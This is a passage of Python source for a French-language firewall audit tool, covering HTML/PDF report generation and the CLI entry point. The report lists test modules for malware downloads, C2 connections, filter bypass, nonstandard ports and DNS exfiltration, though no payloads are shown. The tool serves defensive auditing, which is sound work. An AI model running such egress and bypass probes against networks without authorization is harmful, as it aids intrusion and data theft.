            ok=is_pass(t); rc="#16a34a" if ok else "#dc2626"; icon="✅" if ok else "❌"
            cells = "".join(f'<td>{t.get(c,"—")}</td>' for c in cols)
            rows += f'<tr><td style="color:{rc};font-size:1.05em">{icon}</td>{cells}<td style="color:{rc}">{t.get("details","")}</td><td style="color:#6b7280;white-space:nowrap">{t.get("duration_ms","?")} ms</td></tr>'
        return rows

    eicar_rows = build_table(results["modules"].get("eicar",    []),["name","url","category"])
    c2_rows    = build_table(results["modules"].get("c2_ip",    []),["name","ip","port"])
    dns_rows   = build_table(results["modules"].get("dns",      []),["name","domain","category"])
    ssl_rows   = build_table(results["modules"].get("ssl",      []),["name","host","category"])
    app_rows   = build_table(results["modules"].get("app_layer",[]),["name","category","description"])

    def build_conf_table(tests, cols):
        """Table avec colonne confiance en plus."""
        rows = ""
        for t in tests:
            ok   = is_pass(t); rc = "#16a34a" if ok else "#dc2626"; icon = "✅" if ok else "❌"
            conf = t.get("confidence","?")
            cells = "".join(f'<td>{t.get(c,"—")}</td>' for c in cols)
            rows += (f'<tr><td style="color:{rc};font-size:1.05em">{icon}</td>' +
                     cells +
                     f'<td style="color:{rc}">{t.get("details","")}</td>' +
                     f'<td>{conf_badge(conf)}</td>' +
                     f'<td style="color:#6b7280;white-space:nowrap">{t.get("duration_ms","?")} ms</td></tr>')
        return rows

    def build_bw_table(tests):
        rows = ""
        for t in tests:
            kbps = t.get("speed_kbps",0)
            conf = t.get("confidence","?")
            icon = "📶"
            rows += (f'<tr><td>{icon}</td>' +
                     f'<td>{t.get("name","")}</td>' +
                     f'<td>{t.get("category","")}</td>' +
                     f'<td style="color:#38bdf8;font-weight:700">{kbps} KB/s</td>' +
                     f'<td style="color:#6b7280">{t.get("description","")}</td>' +
                     f'<td>{t.get("details","")}</td>' +
                     f'<td>{conf_badge(conf)}</td>' +
                     f'<td style="color:#6b7280;white-space:nowrap">{t.get("duration_ms","?")} ms</td></tr>')
        return rows

    bypass_rows    = build_conf_table(results["modules"].get("bypass",           []),["name","technique","description"])
    proto_rows     = build_conf_table(results["modules"].get("protocols",         []),["name","protocol","port","description"])
    ports_rows     = build_conf_table(results["modules"].get("nonstandard_ports", []),["name","port","category","description"])
    dns_exfil_rows = build_conf_table(results["modules"].get("dns_exfil",         []),["name","domain","qtype","description"])
    upload_rows    = build_conf_table(results["modules"].get("upload",            []),["name","filename","description"])
    bw_rows        = build_bw_table(  results["modules"].get("bandwidth",         []))

    # ── Recommandations ────────────────────────────────────────────────────────
    recs_html = ""
    if recs:
        for rec in recs:
            recs_html += f'''<div class="rec-item" style="border-left:3px solid {rec["color"]}">
              <div class="rec-header">
                <span style="color:{rec["color"]};font-weight:700">{rec["label"]}</span>
                {sev_badge(rec["severity"])}
                <span style="color:#6b7280;font-size:.72rem;margin-left:auto">{rec["fails"]}/{rec["total"]} non bloqué(s) ({rec["pct_fail"]}%)</span>
              </div>
              <div class="rec-title">⚠️  {rec["title"]}</div>
              <div class="rec-detail">{rec["detail"]}</div>
            </div>'''
    else:
        recs_html = '<div style="color:#4ade80;padding:1rem">✅ Aucune recommandation critique — filtrage en ordre.</div>'

    # ── Global chart SVG (barres horizontales) ─────────────────────────────────
    chart_bars = ""
    bar_items = [(v["label"],v["pct"]) for k,v in score_data.items() if not k.startswith("_")]
    for i,(lbl,p) in enumerate(bar_items):
        y = i*28; c=pct_color(p); w=round(p*2.8)
        chart_bars += f'''
        <g transform="translate(0,{y})">
          <text x="0" y="13" fill="#9ca3af" font-size="9" font-family="monospace">{lbl[:22]}</text>
          <rect x="0" y="16" width="280" height="8" rx="4" fill="#1f2937"/>
          <rect x="0" y="16" width="{w}" height="8" rx="4" fill="{c}"/>
          <text x="285" y="24" fill="{c}" font-size="9" font-weight="700" font-family="monospace">{p}%</text>
        </g>'''
    chart_h = len(bar_items)*28+10
    chart_svg = f'<svg viewBox="0 0 320 {chart_h}" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:360px">{chart_bars}</svg>'

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FirewallTester v3 — {client.get('name','Audit')}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
  :root{{--bg:#0a0f1a;--surface:#111827;--surface2:#1f2937;--border:#374151;--text:#f9fafb;--muted:#9ca3af;--accent:#38bdf8}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px}}
  a{{color:var(--accent);text-decoration:none}} a:hover{{text-decoration:underline}}
  /* HEADER */
  header{{background:var(--surface);border-bottom:1px solid var(--border);padding:1.2rem 2.5rem;display:flex;justify-content:space-between;align-items:center;gap:1rem}}
  .hdr-left{{display:flex;align-items:center;gap:1rem}}
  header h1{{font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:800}}
  header h1 span{{color:var(--accent)}}
  .hdr-meta{{color:var(--muted);font-size:.72rem;line-height:1.9;text-align:right}}
  /* COVER BAND */
  .cover{{background:linear-gradient(135deg,#0f172a 0%,#1e1b4b 100%);border-bottom:1px solid var(--border);padding:1.5rem 2.5rem;display:flex;align-items:center;gap:2rem}}
  .cover-grade{{display:flex;flex-direction:column;align-items:center;justify-content:center;width:90px;height:90px;border-radius:10px;background:var(--bg);border:2px solid {gc};flex-shrink:0}}
  .cover-grade .gl{{font-family:'Syne',sans-serif;font-size:2.5rem;font-weight:800;color:{gc}}}
  .cover-grade .gp{{font-size:.7rem;color:var(--muted)}}
  .cover-info h2{{font-family:'Syne',sans-serif;font-size:1.1rem;font-weight:700;margin-bottom:.4rem}}
  .cover-info p{{color:var(--muted);font-size:.72rem;line-height:1.7}}
  /* MAIN */
  .main{{padding:1.5rem 2.5rem;max-width:1400px;margin:0 auto}}
  /* SUMMARY GRID */
  .card{{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin-bottom:1.5rem}}
  .card h3{{font-family:'Syne',sans-serif;font-size:.8rem;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1px;margin-bottom:1rem;border-left:3px solid var(--accent);padding-left:.6rem}}
  .mod-score{{display:grid;grid-template-columns:1fr auto auto;gap:.6rem;align-items:center;margin-bottom:.55rem}}
  .mod-label{{color:var(--muted);font-size:.72rem}}
  .bar-wrap{{grid-column:1/-1;background:var(--bg);border-radius:4px;height:5px;margin-top:-3px;margin-bottom:2px}}
  .mod-score .bar-wrap{{grid-column:unset;width:100%;margin:0}}
  .mod-score{{display:flex;flex-direction:column;gap:.2rem;margin-bottom:.75rem}}
  .mod-score>div{{display:flex;justify-content:space-between;align-items:center}}
  .bar-fill{{height:5px;border-radius:4px}}
  .mod-pct{{font-size:.7rem;font-weight:700;white-space:nowrap}}
  /* SECTIONS */
  h2{{font-family:'Syne',sans-serif;font-size:.88rem;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1px;margin:2rem 0 .75rem;border-left:3px solid var(--accent);padding-left:.7rem}}
  /* ACCORDION */
  .acc-item{{border:1px solid var(--border);border-radius:8px;margin-bottom:.5rem;overflow:hidden}}
  .acc-header{{width:100%;background:var(--surface);border:none;padding:.7rem 1rem;display:flex;align-items:center;gap:.75rem;cursor:pointer;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.78rem;text-align:left;transition:background .15s}}
  .acc-header:hover{{background:var(--surface2)}}
  .acc-donut{{flex-shrink:0}}
  .acc-info{{flex:1;display:flex;flex-direction:column;gap:.3rem}}
  .acc-label{{font-weight:700;font-size:.82rem}}
  .acc-pills{{display:flex;gap:.4rem;flex-wrap:wrap}}
  .pill{{padding:.15rem .55rem;border-radius:999px;font-size:.65rem;font-weight:700}}
  .pill-block{{background:#3f1010;color:#fca5a5}}
  .pill-pass{{background:#052e16;color:#86efac}}
  .acc-arrow{{color:var(--muted);font-size:.7rem;transition:transform .2s;flex-shrink:0}}
  .acc-body{{background:var(--bg);border-top:1px solid var(--border)}}
  /* TABLES */
  .table-wrap{{overflow-x:auto;border-radius:8px;border:1px solid var(--border);margin-bottom:1.5rem}}
  table{{width:100%;border-collapse:collapse}}
  thead{{background:var(--surface2)}}
  th{{padding:.5rem 1rem;text-align:left;color:var(--muted);font-size:.65rem;text-transform:uppercase;letter-spacing:.5px;font-weight:700;white-space:nowrap}}
  td{{padding:.45rem 1rem;border-top:1px solid var(--border);word-break:break-all}}
  tr:hover td{{background:var(--surface2)}}
  .td-name{{white-space:nowrap;min-width:130px}}
  .td-url{{color:var(--muted);font-size:.72rem}}
  /* RECOMMENDATIONS */
  .rec-item{{background:var(--surface);border-radius:8px;margin-bottom:.75rem;padding:1rem 1.25rem;border-left:3px solid #6b7280}}
  .rec-header{{display:flex;align-items:center;gap:.6rem;margin-bottom:.4rem;flex-wrap:wrap}}
  .rec-title{{font-weight:700;font-size:.82rem;margin-bottom:.3rem;color:var(--text)}}
  .rec-detail{{color:var(--muted);font-size:.75rem;line-height:1.6}}
  /* FOOTER */
  .footer-band{{background:var(--surface);border-top:1px solid var(--border);padding:1rem 2.5rem;display:flex;justify-content:space-between;align-items:center;font-size:.68rem;color:var(--muted);margin-top:2rem}}
  @media print{{.acc-body{{display:block!important}}}}
</style>
</head>
<body>

<header>
  <div class="hdr-left">
    {logo_html}
    <div>
      <h1>🔥 Firewall<span>Tester</span> <span style="font-size:.75rem;color:var(--muted);font-weight:400">v3.0</span></h1>
      <div style="color:var(--muted);font-size:.68rem">{audit.get('title','Audit Pare-feu & Web Policy')} — {audit.get('confidentiality','CONFIDENTIEL')}</div>
    </div>
  </div>
  <div class="hdr-meta">
    <div>Client : <b style="color:var(--text)">{client.get('name','—')}</b></div>
    <div>Auditeur : <b style="color:var(--text)">{auditor.get('name','—')} — {auditor.get('company','—')}</b></div>
    <div>Hôte : <b style="color:var(--text)">{hostname}</b> / {os_info}</div>
    <div>Date : <b style="color:var(--text)">{ts[:19].replace('T',' ')}</b></div>
    <div>Proxy : <b style="color:var(--text)">{proxy_info}</b></div>
  </div>
</header>

<div class="cover">
  <div class="cover-grade">
    <div class="gl">{gl}</div>
    <div class="gp">{g['pct']}%</div>
  </div>
  <div class="cover-info">
    <h2>Score global : {g['passed']}/{g['total']} tests réussis</h2>
    <p>Période : {audit.get('period_start','—')} → {audit.get('period_end','—')}<br>
       Version rapport : {audit.get('version','1.0')}<br>
       OS audité : {os_info}</p>
  </div>
</div>

<div class="main">

  <div class="card" style="margin-bottom:1.5rem">
    <h3>📊 Scores par module</h3>
    {score_bars}
  </div>

  <h2>⚠️ Recommandations ({len(recs)})</h2>
  {recs_html}

  <h2>🌐 URL / Web Policy — par Catégorie</h2>
  {accordion_html}

  <h2>☣️ EICAR / Malware Downloads</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>URL</th><th>Catégorie</th><th>Résultat</th><th>Temps</th></tr></thead>
    <tbody>{eicar_rows}</tbody>
  </table></div>

  <h2>🎯 C2 / Malicious IP Connections</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>IP</th><th>Port</th><th>Résultat</th><th>Temps</th></tr></thead>
    <tbody>{c2_rows}</tbody>
  </table></div>

  <h2>🔍 DNS Filtering</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Domaine</th><th>Catégorie</th><th>Résultat</th><th>Temps</th></tr></thead>
    <tbody>{dns_rows}</tbody>
  </table></div>

  <h2>🔒 SSL / TLS Inspection</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Hôte</th><th>Catégorie</th><th>Résultat</th><th>Temps</th></tr></thead>
    <tbody>{ssl_rows}</tbody>
  </table></div>

  <h2>🧱 Application Layer — WAF / IPS</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Catégorie</th><th>Description</th><th>Résultat</th><th>Temps</th></tr></thead>
    <tbody>{app_rows}</tbody>
  </table></div>

  <h2>🔓 Bypass / Contournement de filtrage</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Technique</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{bypass_rows}</tbody>
  </table></div>

  <h2>🔌 Protocoles alternatifs</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Proto</th><th>Port</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{proto_rows}</tbody>
  </table></div>

  <h2>🚪 Ports non standard</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Port</th><th>Catégorie</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{ports_rows}</tbody>
  </table></div>

  <h2>📡 Exfiltration DNS</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Domaine</th><th>Type</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{dns_exfil_rows}</tbody>
  </table></div>

  <h2>📤 Upload fichiers suspects</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Fichier</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{upload_rows}</tbody>
  </table></div>

  <h2>📶 Bandwidth / QoS</h2>
  <div class="table-wrap"><table>
    <thead><tr><th></th><th>Test</th><th>Catégorie</th><th>Vitesse</th><th>Description</th><th>Résultat</th><th>Confiance</th><th>Temps</th></tr></thead>
    <tbody>{bw_rows}</tbody>
  </table></div>

</div>

<div class="footer-band">
  <span>FirewallTester v3.0 — {auditor.get('company','—')} — {auditor.get('name','—')}</span>
  <span>{audit.get('confidentiality','CONFIDENTIEL')} — {ts[:10]}</span>
  <span>⚠️  Usage sur réseaux autorisés uniquement</span>
</div>

<script>
function toggleAcc(id){{
  var el=document.getElementById(id), arrow=document.getElementById(id+'_arrow');
  if(el.style.display==='none'){{el.style.display='block';arrow.style.transform='rotate(90deg)'}}
  else{{el.style.display='none';arrow.style.transform=''}}
}}
</script>
</body>
</html>"""

    with open(output_path,"w",encoding="utf-8") as f:
        f.write(html)
    print(f"\n[+] Rapport HTML : {output_path}")

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════════════════
# PDF EXPORT
# ═══════════════════════════════════════════════════════════════════════════════

def export_pdf(html_path, pdf_path):
    """
    Tente d'exporter le rapport HTML en PDF.
    Ordre de priorité : WeasyPrint → pdfkit (wkhtmltopdf) → message d'erreur.
    """
    # ── Tentative 1 : WeasyPrint ───────────────────────────────────────────────
    try:
        from weasyprint import HTML as WP_HTML
        print(f"[*] Export PDF via WeasyPrint…")
        WP_HTML(filename=html_path).write_pdf(pdf_path)
        print(f"[+] PDF généré : {pdf_path}")
        return True
    except ImportError:
        pass
    except Exception as e:
        print(f"[!] WeasyPrint erreur : {e}")

    # ── Tentative 2 : pdfkit (wkhtmltopdf) ────────────────────────────────────
    try:
        import pdfkit
        print(f"[*] Export PDF via pdfkit…")
        options = {
            "enable-local-file-access": "",
            "quiet": "",
            "page-size": "A4",
            "margin-top": "10mm",
            "margin-bottom": "10mm",
            "margin-left": "10mm",
            "margin-right": "10mm",
            "encoding": "UTF-8",
            "no-outline": None,
            "print-media-type": "",
        }
        pdfkit.from_file(html_path, pdf_path, options=options)
        print(f"[+] PDF généré : {pdf_path}")
        return True
    except ImportError:
        pass
    except Exception as e:
        print(f"[!] pdfkit erreur : {e}")

    # ── Aucun moteur disponible ────────────────────────────────────────────────
    print("[!] Export PDF impossible — aucun moteur disponible.")
    print("    Installez WeasyPrint  : pip install weasyprint")
    print("    Ou pdfkit             : pip install pdfkit")
    print("    (pdfkit nécessite aussi wkhtmltopdf : https://wkhtmltopdf.org)")
    return False

def load_config(path="config.json"):
    if os.path.exists(path):
        try:
            with open(path,encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"client":{},"auditor":{},"audit":{},"proxy":{"enabled":False}}

def main():
    parser = argparse.ArgumentParser(
        description="FirewallTester v3.0 — Firewall & Web Policy Audit Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--modules", nargs="+",
                        choices=["url","eicar","c2","dns","ssl","app","bypass","proto","ports","dns_exfil","upload","bandwidth"],
                        help="Modules (défaut: tous)")
    parser.add_argument("--no-html",  action="store_true", help="Pas de rapport HTML")
    parser.add_argument("--output",   default=None,        help="Nom du rapport HTML")
    parser.add_argument("--json",     action="store_true", help="Export JSON")
    parser.add_argument("--verbose",  action="store_true", help="Affiche chaque résultat")
    parser.add_argument("--no-tui",   action="store_true", help="Mode CLI direct (sans menu)")
    parser.add_argument("--proxy",    default=None,        help="URL proxy (ex: http://user:pass@proxy:3128)")
    parser.add_argument("--config",   default="config.json", help="Fichier config (défaut: config.json)")
    parser.add_argument("--pdf",      action="store_true", help="Exporte aussi en PDF (nécessite WeasyPrint ou pdfkit+wkhtmltopdf)")
    args = parser.parse_args()

    config = load_config(args.config)

    # Proxy CLI override
    if args.proxy:
        PROXIES.update({"http":args.proxy,"https":args.proxy})
        config["proxy"]["enabled"]=True; config["proxy"]["url"]=args.proxy
    elif config.get("proxy",{}).get("enabled"):
        PROXIES.update(build_proxies(config["proxy"]))
    else:
        sys_proxy = detect_system_proxy()
        if sys_proxy:
            PROXIES.update({"http":sys_proxy,"https":sys_proxy})

    modules   = args.modules
    export_pdf_flag = getattr(args, 'pdf', False)
    out_html  = args.output or f"firewall_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    export_json = args.json

    # TUI
    if not args.no_tui and sys.stdin.isatty():
        modules, out_html, export_json, export_pdf_flag, config = tui_menu(config)

    clear()
    print("═"*65)
    print(f"  🔥 FirewallTester v{VERSION} — Lancement de l'audit")
    print("═"*65)
    print(f"  Host    : {socket.gethostname()}")
    print(f"  OS      : {platform.system()} {platform.release()}")
    print(f"  Client  : {config.get('client',{}).get('name','—')}")
    print(f"  Proxy   : {list(PROXIES.values())[0] if PROXIES else 'direct'}")
    print(f"  Modules : {', '.join(modules) if modules else 'tous'}")
    print("═"*65)

    results    = run_all_tests(modules=modules, verbose=args.verbose or True)
    score_data = compute_score(results)
    recs       = compute_recommendations(results)
    g          = score_data["_global"]

    print(f"\n{'═'*65}")
    print(f"  SCORE GLOBAL : {g['passed']}/{g['total']} ({g['pct']}%)")
    for k,v in score_data.items():
        if k.startswith("_"): continue
        bar = "█"*(v["pct"]//10)+"░"*(10-v["pct"]//10)
        st  = "✅" if v["pct"]>=80 else ("⚠️ " if v["pct"]>=50 else "❌")
        print(f"  {st} {v['label']:<28} {bar} {v['pct']}%")
    if recs:
        print(f"\n  ⚠️  {len(recs)} recommandation(s) générée(s)")
        for r in recs:
            print(f"     [{r['severity'].upper():<8}] {r['title']}")
    print(f"{'═'*65}\n")

    if not args.no_html:
        generate_html_report(results, score_data, recs, config, out_html)
        if export_pdf_flag or getattr(args, 'pdf', False):
            pdf_path = out_html.replace('.html', '.pdf')
            export_pdf(out_html, pdf_path)

    if export_json:
        out_json = out_html.replace(".html",".json")
        with open(out_json,"w",encoding="utf-8") as f:
            json.dump({"results":results,"score":score_data,"recommendations":recs},f,indent=2)
        print(f"[+] JSON : {out_json}")

    print("\n[!] Utilisation réservée aux réseaux dont vous êtes propriétaire ou avez une autorisation écrite.")


if __name__ == "__main__":
    main()
